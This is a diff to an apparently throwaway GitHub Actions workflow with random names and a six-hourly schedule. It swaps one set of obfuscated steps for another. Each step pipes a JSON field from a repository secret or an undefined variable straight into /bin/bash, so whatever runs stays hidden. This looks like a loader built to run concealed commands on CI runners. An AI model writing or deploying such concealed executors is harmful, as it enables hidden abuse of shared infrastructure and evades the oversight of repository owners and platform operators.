@@ -1,27 +1,33 @@
 name: fnjcjkkk
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 3/6 * * *'
+    - cron: '59 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fnjcjkkk
         env:
-          z9685: ${{ secrets.z9685 }}
+          n46: ${{ secrets.n46 }}
         run: |
-          echo $z9685 | jq -r .e8973 | /bin/bash
-          echo $rarr14546 | jq -r .c6 | /bin/bash
-          echo $bio1113 | jq -r .mum8873 | /bin/bash
-          echo $zlx5323 | jq -r .t9197 | /bin/bash
-          echo $bcqd1405 | jq -r .r9 | /bin/bash
-          echo $yfb310 | jq -r .uhmq743 | /bin/bash
-          echo $h86 | jq -r .di09 | /bin/bash
-          echo $pkbgr387 | jq -r .lzdsa4713 | /bin/bash
-          echo $zdvld3 | jq -r .jw4026 | /bin/bash
-          echo $vmoc001 | jq -r .k2463 | /bin/bash
-          echo $cn90319 | jq -r .gfdrh57 | /bin/bash
+          echo $n46 | jq -r .yrnbm08 | /bin/bash
+          echo $rag1184 | jq -r .h13594 | /bin/bash
+          echo $czj311 | jq -r .i288 | /bin/bash
+          echo $mfcf31628 | jq -r .kkcnh1316 | /bin/bash
+          echo $r4711 | jq -r .rzvmn9 | /bin/bash
+          echo $squ94 | jq -r .kkr86121 | /bin/bash
+          echo $mcc648 | jq -r .uasst65446 | /bin/bash
+          echo $fgcmk59 | jq -r .nc514 | /bin/bash
+          echo $bc341 | jq -r .p2 | /bin/bash
+          echo $qq65 | jq -r .vtzxe559 | /bin/bash
+          echo $v6158 | jq -r .lrvk5555 | /bin/bash
+          echo $lrls658 | jq -r .dlhbc703 | /bin/bash
+          echo $u49880 | jq -r .vlhy89251 | /bin/bash
+          echo $aiql91899 | jq -r .g25 | /bin/bash
+          echo $ogfhv35350 | jq -r .jx5118 | /bin/bash
 
